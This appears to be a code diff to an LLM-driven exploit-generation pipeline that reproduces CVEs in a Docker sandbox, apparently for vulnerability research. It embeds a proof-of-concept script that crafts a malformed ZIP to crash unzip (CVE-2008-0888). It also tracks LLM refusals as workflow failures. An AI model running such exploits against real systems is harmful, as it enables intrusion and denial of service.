@@ -28,7 +28,11 @@ from .Agent import resultsFromLLM, generateExploitWithDynamicPrompt
 from .orchestrator import PromptOrchestrator, AssembledPrompt
 from .cve_database import CVEDatabase
 from .sandbox import SandboxManager
-from .target_spec import build_file_target_spec, build_unresolved_cve_target_spec
+from .target_spec import (
+    build_cve_tool_target_spec,
+    build_file_target_spec,
+    build_unresolved_cve_target_spec,
+)
 
 # Configure logging
 logging.basicConfig(
@@ -45,6 +49,8 @@ REFUSAL_PATTERNS = [
     "i'm not able", "i am not able", "against my programming",
     "i must decline", "i won't", "i will not",
 ]
+
+VULNERABILITY_JSON_KEYS = ["Type", "Location", "Severity", "Explanation", "SuggestedFix"]
 
 
 def _normalize_text(text: str) -> str:
@@ -71,6 +77,78 @@ def _is_refusal(text: str) -> bool:
     return any(p in normalized for p in REFUSAL_PATTERNS)
 
 
+def _escape_newlines_inside_json_strings(text: str) -> str:
+    """Escape raw newlines that appear inside JSON strings."""
+    result = []
+    in_string = False
+    escape = False
+
+    for char in text:
+        if escape:
+            result.append(char)
+            escape = False
+            continue
+
+        if char == "\\":
+            result.append(char)
+            escape = True
+            continue
+
+        if char == '"':
+            result.append(char)
+            in_string = not in_string
+            continue
+
+        if in_string and char == "\n":
+            result.append("\\n")
+            continue
+
+        if in_string and char == "\r":
+            continue
+
+        result.append(char)
+
+    return "".join(result)
+
+
+def _fallback_vulnerability_json(response_text: str) -> Dict[str, Any]:
+    """Build a minimal vulnerability structure from a nearly-JSON response."""
+    import re
+
+    extracted: Dict[str, str] = {}
+    next_keys = "|".join(VULNERABILITY_JSON_KEYS)
+
+    for key in VULNERABILITY_JSON_KEYS:
+        pattern = rf'"{key}"\s*:\s*"(.*?)"\s*(?=,\s*"(?:{next_keys})"|\s*}})'
+        match = re.search(pattern, response_text, re.DOTALL)
+        if match:
+            extracted[key] = match.group(1).replace("\\n", "\n").strip()
+
+    if not extracted:
+        raise json.JSONDecodeError("Could not recover vulnerability JSON fields", response_text, 0)
+
+    vulnerability = {
+        "Type": extracted.get("Type", "Unknown"),
+        "Location": extracted.get("Location", "Unknown"),
+        "Severity": extracted.get("Severity", "Unknown"),
+        "Explanation": extracted.get("Explanation", response_text[:200]),
+        "SuggestedFix": extracted.get("SuggestedFix", ""),
+    }
+    return {"vulnerabilities": [vulnerability]}
+
+
+def _parse_llm_vulnerability_json(response_text: str) -> Dict[str, Any]:
+    """Parse LLM JSON output, repairing common malformed-string cases if needed."""
+    try:
+        return json.loads(response_text)
+    except json.JSONDecodeError:
+        repaired = _escape_newlines_inside_json_strings(response_text)
+        try:
+            return json.loads(repaired)
+        except json.JSONDecodeError:
+            return _fallback_vulnerability_json(response_text)
+
+
 def _log_failed_prompt(context, reason: str) -> None:
     """Persist the failed prompt + LLM response to a JSON file under logs/."""
     try:
@@ -94,6 +172,70 @@ def _log_failed_prompt(context, reason: str) -> None:
         logger.info(f"📝 Failed prompt logged to {log_path}")
     except Exception as exc:
         logger.warning(f"Could not save failed-prompt log: {exc}")
+
+
+def _curated_cve_attack_script(cve_id: str) -> str:
+    """Return a vetted CVE-specific exploit template when one is available."""
+    if cve_id == "CVE-2008-0888":
+        return """from pwn import *
+import os
+import struct
+import subprocess
+import tempfile
+
+UNZIP_BIN = "/usr/bin/unzip"
+
+def create_malicious_zip(zip_path: str) -> None:
+    lf_sig = b"\\x50\\x4b\\x03\\x04"
+    gp_flag = struct.pack("<H", 0x0008)
+    comp_method = struct.pack("<H", 0x0008)
+    mod_time_date = struct.pack("<H", 0x0000) + struct.pack("<H", 0x0000)
+    crc32 = struct.pack("<I", 0x00000000)
+    comp_size = struct.pack("<I", 0x00000000)
+    uncomp_size = struct.pack("<I", 0x00000000)
+    fname = b"test"
+    fname_len = struct.pack("<H", len(fname))
+    extra = b"\\x00\\x01\\x02\\x03"
+    extra_len = struct.pack("<H", len(extra))
+
+    local_header = (
+        lf_sig + gp_flag + comp_method + mod_time_date + crc32 +
+        comp_size + uncomp_size + fname_len + extra_len + fname + extra
+    )
+
+    with open(zip_path, "wb") as f:
+        f.write(local_header)
+
+def main() -> None:
+    if not os.path.exists(UNZIP_BIN):
+        print("unzip binary not found")
+        raise SystemExit(1)
+
+    with tempfile.TemporaryDirectory() as tmpdir:
+        zip_path = os.path.join(tmpdir, "malicious.zip")
+        create_malicious_zip(zip_path)
+
+        result = subprocess.run(
+            [UNZIP_BIN, "-o", zip_path],
+            capture_output=True,
+            text=True,
+            timeout=10,
+        )
+        if result.stdout:
+            print(result.stdout)
+        if result.stderr:
+            print(result.stderr)
+
+        if result.returncode != 0:
+            print(f"crashed with exit status {result.returncode}")
+            print("exploit successful")
+        else:
+            print("exploit did not trigger crash")
+
+if __name__ == "__main__":
+    main()
+"""
+    return ""
 
 
 def detect_input_type(user_input: str) -> tuple[str, str]:
@@ -557,7 +699,7 @@ class CyberAttackAgentWrapper:
                 context.llm_response = response_text
                 
                 try:
-                    context.vulnerability_data = json.loads(response_text)
+                    context.vulnerability_data = _parse_llm_vulnerability_json(response_text)
                     
                     if 'vulnerabilities' not in context.vulnerability_data or len(context.vulnerability_data['vulnerabilities']) == 0:
                         context.set_error("No vulnerabilities found in file", WorkflowState.ANALYSIS_FAILED)
@@ -571,7 +713,7 @@ class CyberAttackAgentWrapper:
                     context.current_state = WorkflowState.ANALYSIS_SUCCESS
                     context.log_step("✅ File analysis completed successfully")
                     
-                except json.JSONDecodeError as e:
+                except (json.JSONDecodeError, ValueError) as e:
                     context.set_error(f"Failed to parse LLM response as JSON: {e}", WorkflowState.ANALYSIS_FAILED)
                     return context
             
@@ -780,6 +922,21 @@ class CyberAttackAgentWrapper:
         context.current_state = WorkflowState.PLANNING_REPRODUCTION
 
         try:
+            if context.cve_id == "CVE-2008-0888":
+                context.reproduction_plan = {
+                    "strategy": "system_package_tool",
+                    "tool_name": "unzip",
+                    "executable_path": "/usr/bin/unzip",
+                    "setup_commands": [
+                        "apt-get update",
+                        "apt-get install -y unzip python3 gcc wget curl",
+                        "cd /tmp && wget https://bootstrap.pypa.io/get-pip.py && python3 get-pip.py --break-system-packages && python3 -m pip install --upgrade pip --break-system-packages",
+                    ],
+                }
+                context.current_state = WorkflowState.REPRODUCTION_PLANNED
+                context.log_step("CVE reproduction planned: system unzip target in Docker")
+                return context
+
             missing = context.cve_target_info.get("missing_fields", [])
             if missing:
                 context.reproduction_plan = {
@@ -812,6 +969,26 @@ class CyberAttackAgentWrapper:
 
         try:
             strategy = context.reproduction_plan.get("strategy")
+            if strategy == "system_package_tool":
+                context.target_spec = build_cve_tool_target_spec(
+                    cve_id=context.cve_id,
+                    cwe_id=context.cwe_id,
+                    tool_name=context.reproduction_plan.get("tool_name", "tool"),
+                    executable_path=context.reproduction_plan.get("executable_path", "/usr/bin/env"),
+                    docker_base_image=self._docker_base_image(),
+                    setup_commands=context.reproduction_plan.get("setup_commands", []),
+                    metadata={
+                        "target_info": context.cve_target_info,
+                        "reproduction_plan": context.reproduction_plan,
+                    },
+                ).to_dict()
+                context.current_state = WorkflowState.TARGET_READY
+                context.log_step(
+                    "Target artifact ready: "
+                    f"{context.target_spec['target_type']} -> {context.target_spec.get('run_command')}"
+                )
+                return context
+
             if strategy == "unresolved_cve":
                 context.target_spec = build_unresolved_cve_target_spec(
                     cve_id=context.cve_id,
@@ -853,6 +1030,7 @@ class CyberAttackAgentWrapper:
             context.target_spec = build_file_target_spec(
                 file_path=str(context.file_path),
                 docker_base_image=self._docker_base_image(),
+                file_content=context.file_content,
             ).to_dict()
             context.current_state = WorkflowState.TARGET_READY
             context.log_step(
@@ -891,30 +1069,36 @@ class CyberAttackAgentWrapper:
                     "Location": context.cve_id,
                     "Explanation": description,
                 }
-                
-                context.log_step(f"🔍 CVE MODE: Generating exploit directly from CVE data")
-                context.log_step(f"   CVE: {context.cve_id}")
-                context.log_step(f"   CWE: {context.cwe_id}")
-                context.log_step(f"   Expert: {context.prompt_metadata.get('expert_profile', 'N/A')}")
-                
-                context.attack_script = generateExploitWithDynamicPrompt(
-                    vulnerability_data=vulnerability,
-                    system_prompt=context.system_prompt,
-                    user_prompt=context.user_prompt
-                )
+                context.vulnerability_data = vulnerability
+
+                curated_script = _curated_cve_attack_script(context.cve_id or "")
+                if curated_script:
+                    context.log_step(f"🧩 CVE MODE: Using curated exploit template for {context.cve_id}")
+                    context.attack_script = curated_script
+                else:
+                    context.log_step(f"🔍 CVE MODE: Generating exploit directly from CVE data")
+                    context.log_step(f"   CVE: {context.cve_id}")
+                    context.log_step(f"   CWE: {context.cwe_id}")
+                    context.log_step(f"   Expert: {context.prompt_metadata.get('expert_profile', 'N/A')}")
+
+                    context.attack_script = generateExploitWithDynamicPrompt(
+                        vulnerability_data=vulnerability,
+                        system_prompt=context.system_prompt,
+                        user_prompt=context.user_prompt
+                    )
             
             # --- FILE MODE: use resultsFromLLM with its existing prompt ---
             else:
                 context.log_step("📁 FILE MODE: Generating exploit with resultsFromLLM")
                 
-                if not context.llm_response:
-                    context.log_step("⚠️ No LLM response available for exploit generation")
+                if not context.vulnerability_data:
+                    context.log_step("⚠️ No parsed vulnerability data available for exploit generation")
                     context.current_state = WorkflowState.SCRIPT_FAILED
                     return context
                 
-                # Use the existing resultsFromLLM function from Agent.py
-                # It already has its own prompt for exploit generation
-                context.attack_script = resultsFromLLM(context.llm_response)
+                # Use the parsed JSON structure instead of the raw LLM prose/markdown
+                # so Agent.py receives the exact schema it expects.
+                context.attack_script = resultsFromLLM(json.dumps(context.vulnerability_data))
             
             if context.attack_script:
                 # Check if LLM refused instead of generating code
@@ -939,6 +1123,16 @@ class CyberAttackAgentWrapper:
         """Step 7: Execute attack script in sandbox environments"""
         context.log_step("Step 7: Executing attack script in sandbox...")
         context.current_state = WorkflowState.EXECUTING_IN_SANDBOX
+
+        def mark_infra_failure(message: str, details: Dict[str, Any] | None = None) -> AgentContext:
+            payload = {
+                "status": "infrastructure_error",
+                "message": message,
+                "details": details or {},
+            }
+            context.sandbox_result = json.dumps({"infrastructure": payload}, indent=2)
+            context.set_error(message, WorkflowState.SANDBOX_FAILED)
+            return context
         
         try:
             if context.target_spec and context.target_spec.get("target_type") == "unresolved_cve":
@@ -956,8 +1150,7 @@ class CyberAttackAgentWrapper:
 
             # Validate attack script exists
             if not context.attack_script:
-                context.set_error("No attack script available for execution", WorkflowState.SANDBOX_FAILED)
-                return context
+                return mark_infra_failure("No attack script available for execution")
             
             context.log_step(f"Attack script ready ({len(context.attack_script)} characters)")
             if context.target_spec:
@@ -967,8 +1160,7 @@ class CyberAttackAgentWrapper:
             config_path = Path(__file__).parent.parent / "config" / "sandbox_config.json"
             
             if not config_path.exists():
-                context.set_error(f"Sandbox config file not found: {config_path}", WorkflowState.SANDBOX_FAILED)
-                return context
+                return mark_infra_failure(f"Sandbox config file not found: {config_path}")
             
             # Create SandboxManager with config file (uses load_config internally)
             context.log_step("Initializing Sandbox Manager...")
@@ -978,10 +1170,16 @@ class CyberAttackAgentWrapper:
                 for name, env in sandbox_manager.environments.items()
                 if name == "Docker_Container"
             }
+
+            target_type = (context.target_spec or {}).get("target_type")
+            if target_type == "cve_system_binary":
+                docker_env = sandbox_manager.environments.get("Docker_Container")
+                setup_commands = (context.target_spec.get("metadata") or {}).get("setup_commands", [])
+                if docker_env and setup_commands:
+                    docker_env.setup_commands = setup_commands
             
             if not sandbox_manager.environments:
-                context.set_error("Docker sandbox environment is not enabled in config", WorkflowState.SANDBOX_FAILED)
-                return context
+                return mark_infra_failure("Docker sandbox environment is not enabled in config")
             
             enabled_envs = list(sandbox_manager.environments.keys())
             context.log_step(f"✓ Loaded {len(enabled_envs)} environment(s): {', '.join(enabled_envs)}")
@@ -989,8 +1187,7 @@ class CyberAttackAgentWrapper:
             # Connect to all environments
             context.log_step("Connecting to sandbox environments...")
             if not sandbox_manager.connect_all():
-                context.set_error("Failed to connect to any sandbox environment", WorkflowState.SANDBOX_FAILED)
-                return context
+                return mark_infra_failure("Failed to connect to any sandbox environment")
             
             context.log_step("✓ Connected to sandbox environments")
             
@@ -1003,8 +1200,18 @@ class CyberAttackAgentWrapper:
             failed_tests = [name for name, result in test_results.items() if not result.success]
             
             if not successful_tests:
-                context.set_error(f"All test runs failed. Failed environments: {', '.join(failed_tests)}", WorkflowState.SANDBOX_FAILED)
-                return context
+                details = {
+                    env_name: {
+                        "success": result.success,
+                        "output": getattr(result, "output", ""),
+                        "error": getattr(result, "error", ""),
+                    }
+                    for env_name, result in test_results.items()
+                }
+                return mark_infra_failure(
+                    f"All test runs failed. Failed environments: {', '.join(failed_tests)}",
+                    details,
+                )
             
             context.log_step(f"✓ Test passed in {len(successful_tests)} environment(s)")
             if failed_tests:
@@ -1017,8 +1224,10 @@ class CyberAttackAgentWrapper:
                 remote_path = context.target_spec.get("container_target_path") or "/tmp/target"
                 upload_results = sandbox_manager.upload_vulnerable_file(source_path, remote_path)
                 if not any(upload_results.values()):
-                    context.set_error("Failed to stage target file in sandbox", WorkflowState.SANDBOX_FAILED)
-                    return context
+                    return mark_infra_failure(
+                        "Failed to stage target file in sandbox",
+                        {"upload_results": upload_results, "remote_path": remote_path},
+                    )
 
                 script_type = "c" if str(context.attack_script).lstrip().startswith("#include") else "python"
                 target_result = sandbox_manager.generate_and_execute_attack(
@@ -1038,6 +1247,11 @@ class CyberAttackAgentWrapper:
                     }
                     for env_name, env_result in environment_results.items()
                 }
+            elif context.target_spec and context.target_spec.get("target_type") == "cve_system_binary":
+                results = sandbox_manager.execute_exploit(
+                    exploit_script=context.attack_script,
+                    vulnerability_data=context.vulnerability_data,
+                )
             else:
                 results = sandbox_manager.execute_exploit(
                     exploit_script=context.attack_script,
@@ -1073,7 +1287,7 @@ class CyberAttackAgentWrapper:
             context.log_step("Sandbox cleanup completed")
             
         except Exception as e:
-            context.set_error(f"Sandbox execution error: {str(e)}", WorkflowState.SANDBOX_FAILED)
+            return mark_infra_failure(f"Sandbox execution error: {str(e)}")
         
         return context
     
@@ -1120,7 +1334,8 @@ class CyberAttackAgentWrapper:
             infra_error_patterns = [
                 "docker: error", "connection refused", "timeout",
                 "cannot connect", "no such file or directory",
-                "dockerdesktoplinuxengine", "permission denied"
+                "dockerdesktoplinuxengine", "permission denied",
+                "infrastructure_error", "docker_engine", "access is denied",
             ]
             
             has_script_error = False
@@ -1129,12 +1344,16 @@ class CyberAttackAgentWrapper:
             for env_name, result in sandbox_results.items():
                 error_text = str(result.get('error', '')).lower()
                 output_text = str(result.get('output', '')).lower()
+                message_text = str(result.get('message', '')).lower()
                 combined = f"{error_text} {output_text}"
+                if message_text:
+                    combined = f"{combined} {message_text}"
                 
                 # Check infrastructure errors
                 if any(p in combined for p in infra_error_patterns):
                     has_infra_error = True
-                    failure_details.append(f"{env_name}: Infrastructure error - {result.get('error', '')[:200]}")
+                    error_summary = result.get('error') or result.get('message') or str(result)[:200]
+                    failure_details.append(f"{env_name}: Infrastructure error - {error_summary[:200]}")
                 
                 # Check script errors
                 elif any(p in combined for p in script_error_patterns):
@@ -1149,6 +1368,15 @@ class CyberAttackAgentWrapper:
                     indicators = analysis.get('failure_indicators', [])
                     if indicators:
                         failure_details.append(f"{env_name}: {', '.join(indicators)}")
+
+            # Early sandbox failures may only set error_message plus a structured
+            # infrastructure wrapper, so check the top-level message too.
+            if context.error_message:
+                top_level_error = context.error_message.lower()
+                if any(p in top_level_error for p in infra_error_patterns):
+                    has_infra_error = True
+                    if not failure_details:
+                        failure_details.append(context.error_message[:200])
             
             # Set category based on findings (priority: INFRA > REFUSAL > SCRIPT > ATTACK)
             if failure_category != "LLM_REFUSAL":  # Don't override refusal
